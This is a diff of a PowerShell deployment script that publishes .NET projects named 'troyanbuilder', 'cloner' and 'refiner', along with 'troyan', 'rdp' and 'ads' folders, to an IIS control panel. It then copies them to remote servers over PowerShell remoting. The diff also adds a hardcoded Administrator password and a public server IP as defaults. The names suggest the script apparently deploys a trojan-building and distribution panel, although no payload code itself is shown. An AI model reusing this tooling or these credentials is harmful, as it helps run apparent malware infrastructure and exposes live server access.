@@ -1,8 +1,22 @@
+param (
+    [string]$serverIp, [string]$user, [string]$password, [bool]$direct=$false
+)
+
+if ($serverIp -eq "") {
+    $password = "GXj2lW8ecf"
+    $user="Administrator"
+    $serverIp = "78.111.85.34"
+} 
+
 $scriptDir = Split-Path -Parent $MyInvocation.MyCommand.Path
 Set-Location -Path $scriptDir
-. "..\sys\lib.ps1"
+. ".\lib.ps1"
 
-Stop-Service -Name W3SVC
+if (Get-Service -Name W3SVC -ErrorAction SilentlyContinue) {
+    Stop-Service -Name W3SVC
+} else {
+    Write-Host "Service W3SVC does not exist."
+}
 Add-Type -AssemblyName "System.IO.Compression.FileSystem"
 $www="C:\inetpub\wwwroot"   
 function AddTrusted {
@@ -47,22 +61,30 @@ function Output(){
     Set-Location -Path $scriptDir
     Clear-Folder -FolderPath "C:\inetpub\wwwroot\cp"
 
+    Set-Location -Path $scriptDir
+    Copy-Item -Path "../rdp/*" -Destination "C:\inetpub\wwwroot\cp" -Force -Recurse
+
     Set-Location -Path ../refiner
     dotnet publish -o "C:\inetpub\wwwroot\cp" -c Release -r win-x64 --self-contained
 
     Set-Location -Path $scriptDir
     Set-Location -Path ../troyanbuilder
     dotnet publish -o "C:\inetpub\wwwroot\cp" -c Release -r win-x64 --self-contained
+
+    Set-Location -Path $scriptDir
+    Set-Location -Path ../cloner
+    dotnet publish -o "C:\inetpub\wwwroot\cp" -c Release -r win-x64 --self-contained
         
     Set-Location -Path $scriptDir
     Set-Location -Path ../cp
     dotnet build
     dotnet publish -o "C:\inetpub\wwwroot\cp" -c Release
+    
 
     $nullSource = Split-Path -Path $PSScriptRoot -Parent
     Copy-Folder -SourcePath (Join-Path -Path $nullSource -ChildPath "sys") -DestinationPath "$www\sys" -Clear $true
     Copy-Folder -SourcePath (Join-Path -Path $nullSource -ChildPath "troyan") -DestinationPath "$www\troyan" -Clear $true
-    #Copy-Folder -SourcePath (Join-Path -Path $nullSource -ChildPath "ads") -DestinationPath "$www\ads" -Clear $true
+    Copy-Folder -SourcePath (Join-Path -Path $nullSource -ChildPath "ads") -DestinationPath "$www\ads" -Clear $false
     Copy-Folder -SourcePath (Join-Path -Path $nullSource -ChildPath "php") -DestinationPath "$www\php"  -Clear $true
     Copy-Item -Path (Join-Path -Path $nullSource -ChildPath "defaulticon.ico") -Destination "$www\defaulticon.ico" -Force
     
@@ -77,46 +99,32 @@ Defaults;
 
 $dirs = @(Get-ChildItem -Directory -Path "C:\data")
 
+function Install{
+    param ($serverIp, $login, $password)
 
-foreach ($dir in $dirs) 
-{
-    $serverName = $dir.Name
-    if ($serverName -eq "debug")
-    {
-        continue;
-    }
-    $serverPath = Resolve-Path -Path (Join-Path -Path "C:\data\$serverName" -ChildPath "server.json")
-    $server = Get-Content -Path $serverPath -Raw | ConvertFrom-Json
-    $hostA = $server.serverIp;
-    AddTrusted -hostname $server.serverIp
-    AddTrusted -hostname $server.alias
-    if ($server.disbaled -eq $true)
-    {
-        Write-Host "Skipping becasue disabled... $hostA"
-        continue;
-    }
-    Write-Host "Publish CP REMOTE begin $hostA"
-    $password = $server.password;
+    AddTrusted -hostname $serverIp
+
+    Write-Host "Publish CP REMOTE begin $serverIp"
     if ($password -eq "password" -or $null -eq $password -or $password -eq "")
     {
-        $password = [System.Environment]::GetEnvironmentVariable("SuperPassword_$hostA", [System.EnvironmentVariableTarget]::Machine)
+        $password = [System.Environment]::GetEnvironmentVariable("SuperPassword_$serverIp", [System.EnvironmentVariableTarget]::Machine)
     }
-    if (-not $password -and -not (IsLocalServer -serverIp $server.serverIp )) {
-        Write-Host "Password cannot be null. See SuperPassword_$hostA env var."
+    if (-not $password -and -not (IsLocalServer -serverIp $serverIp )) {
+        Write-Host "Password cannot be null. See SuperPassword_$serverIp env var."
         exit 1
     }
     
     try
     {
-        if (IsLocalServer -serverIp $server.serverIp)
+        if (IsLocalServer -serverIp $serverIp)
         {
-            $session = New-PSSession -ComputerName $server.serverIp
+            $session = New-PSSession -ComputerName $serverIp
         }
         else 
         {
             $spass = (ConvertTo-SecureString -String $password -AsPlainText -Force)
-            $credentialObject = New-Object System.Management.Automation.PSCredential ($server.login, $spass)
-            $session = New-PSSession -ComputerName $server.serverIp -Credential $credentialObject
+            $credentialObject = New-Object System.Management.Automation.PSCredential ($login, $spass)
+            $session = New-PSSession -ComputerName $serverIp -Credential $credentialObject
         }
         Invoke-Command -Session $session -ScriptBlock {
 
@@ -137,7 +145,7 @@ foreach ($dir in $dirs)
         }
     }
     catch {
-        Write-Host "Skipping... $hostA"
+        Write-Host "Skipping... $serverIp"
         continue;
     }
 
@@ -367,7 +375,7 @@ foreach ($dir in $dirs)
         Copy-Folder -SourcePath "C:\_publish\extracted\wwwroot\cp" -DestinationPath $siteDir -Clear $true
         Copy-Folder -SourcePath "C:\_publish\extracted\wwwroot\sys" -DestinationPath "$www\sys" -Clear $true
         Copy-Folder -SourcePath "C:\_publish\extracted\wwwroot\troyan" -DestinationPath "$www\troyan" -Clear $true
-       # Copy-Folder -SourcePath "C:\_publish\extracted\wwwroot\ads" -DestinationPath "$www\ads" -Clear $true
+        Copy-Folder -SourcePath "C:\_publish\extracted\wwwroot\ads" -DestinationPath "$www\ads" -Clear $false
         Copy-Folder -SourcePath "C:\_publish\extracted\wwwroot\php" -DestinationPath "$www\php" -Clear $true
         Copy-Item -Path "C:\_publish\extracted\wwwroot\defaulticon.ico" -Destination "$www\defaulticon.ico" -Force
     
@@ -381,12 +389,35 @@ foreach ($dir in $dirs)
 
         Write-Host "Publish CP REMOTE complete $ipAddress"
 
-    }  -ArgumentList $server.serverIp, $server.login, $password
+    }  -ArgumentList $serverIp, $login, $password
 
     Write-Host "Publish $serverName is complete"
 }
 
-Start-Service -Name W3SVC
+if (-not $direct)
+{
+    foreach ($dir in $dirs)
+    {
+        $serverName = $dir.Name
+        if ($serverName -eq "debug")
+        {
+            continue;
+        }
+        $serverPath = Resolve-Path -Path (Join-Path -Path "C:\data\$serverName" -ChildPath "server.json")
+        $server = Get-Content -Path $serverPath -Raw | ConvertFrom-Json
+        
+        Install -serverIp $server.serverIp -login $server.login -password $server.password
+    }
+} else 
+{
+    Install -serverIp $serverIp -login $user -password $password 
+}
+
+if (Get-Service -Name W3SVC -ErrorAction SilentlyContinue) {
+    Start-Service -Name W3SVC
+} else {
+    Write-Host "Service W3SVC does not exist."
+}
 
 
 Write-Host "Publish all is end"
